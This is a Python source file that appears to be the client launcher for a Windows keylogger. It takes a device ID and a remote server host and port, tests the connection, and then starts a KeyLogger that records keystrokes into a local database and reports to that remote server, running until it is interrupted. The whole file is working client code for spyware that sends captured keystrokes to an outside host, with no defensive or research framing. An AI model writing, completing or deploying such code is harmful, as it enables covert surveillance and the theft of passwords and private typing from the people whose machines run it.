from windows_keylogger import KeyLogger
import time
import sys
import socket
import logging

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

def test_connection(host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            return True
    except Exception as e:
        logger.error(f"Connection test failed: {e}")
        return False

def main():
    if len(sys.argv) != 4:
        print("Usage: python windows_client.py <device_id> <host> <port>")
        sys.exit(1)
    
    device_id = sys.argv[1]
    server_host = sys.argv[2]
    server_port = int(sys.argv[3])
    
    print(f"Testing connection to {server_host}:{server_port}")
    if not test_connection(server_host, server_port):
        print("Connection test failed. Please check:")
        print("1. Is the server running?")
        print("2. Is the IP address correct?")
        print("3. Is the port correct?")
        print("4. Is there a firewall blocking the connection?")
        sys.exit(1)
    
    print(f"Connection successful! Starting keylogger...")
    
    keylogger = KeyLogger(
        db_path="local_backup.db",
        remote_host=server_host,
        remote_port=server_port
    )
    
    result = keylogger.start_logging(device_id)
    print(result)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        print(keylogger.stop_logging())

if __name__ == "__main__":
    main() 